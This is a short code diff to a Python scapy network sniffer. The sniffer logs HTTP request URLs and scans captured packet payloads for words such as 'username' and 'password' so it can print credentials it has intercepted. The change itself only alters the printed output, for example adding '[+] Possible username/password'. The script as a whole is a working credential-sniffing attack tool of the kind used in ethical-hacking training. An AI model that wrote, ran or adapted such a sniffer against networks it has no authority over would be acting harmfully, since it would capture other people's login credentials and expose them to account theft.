@@ -10,15 +10,15 @@ def sniff(interface):
 
 def process_sniffed_packet(packet):
 	if packet.haslayer(http.HTTPRequest):
-		#print(packet.show())
 		url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path 
-		print(url)
+		print("[+] HTTP Request >> " + str(url))
 		if packet.haslayer(scapy.Raw):
 			load = str(packet[scapy.Raw].load)
 			keywords = ["username", "user", "login", "password", "pass"]
 			for keyword in keywords:
 				if keyword in load:
-					print(load)
+					print("\n\n[+] Possible username/password > " 
+						+ load + "\n\n")
 					break
 		
 
